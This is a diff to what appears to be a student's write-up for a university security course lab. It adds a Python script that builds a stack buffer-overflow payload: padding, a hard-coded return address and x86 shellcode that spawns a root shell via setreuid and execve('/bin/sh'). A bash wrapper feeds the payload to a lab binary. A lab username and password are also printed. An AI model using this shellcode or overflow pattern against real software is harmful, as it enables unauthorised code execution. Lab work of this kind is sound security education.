@@ -1,4 +1,4 @@
-# 1
+## 1
 
 The makefile is interesting and I think the professor tried his best to
 make the program unsafe.
@@ -56,3 +56,45 @@ You have to let it all go. Fear, doubt, and disbelief. Free your mind.
 Next username: smith
 Next password: 37ZFBrAPm8
 ```
+
+My code is attached below
+```
+############# egg3
+#!/usr/bin/python3
+
+def fuck8(txt):
+    assert(len(txt) == 8)
+    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
+
+def revert(txt):
+    assert(len(txt) % 8 == 0)
+    res = ""
+    for i in range(int(len(txt) / 8)):
+        res += fuck8(txt[i*8:(i+1)*8])
+    return res
+
+
+fill = "0123456789abcdef0123456789abcdef01234567"
+#cs161-ace# raddr = "bffffa40"
+#cs161-atw# raddr = "bffffad0"
+raddr = "bffffad0"
+#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
+########################################################################################### <- append an endline (0x0a, \n)
+
+payload = revert(fill) + revert(raddr) + (shellcode)
+print(payload)
+
+import binascii
+
+b = binascii.unhexlify(payload)
+with open('input.txt','wb+') as f:
+    f.write(b)
+############# egg
+#!/bin/bash
+
+./egg3 > /dev/null
+cat input.txt # | invoke dejavu
+```
+
+## 2
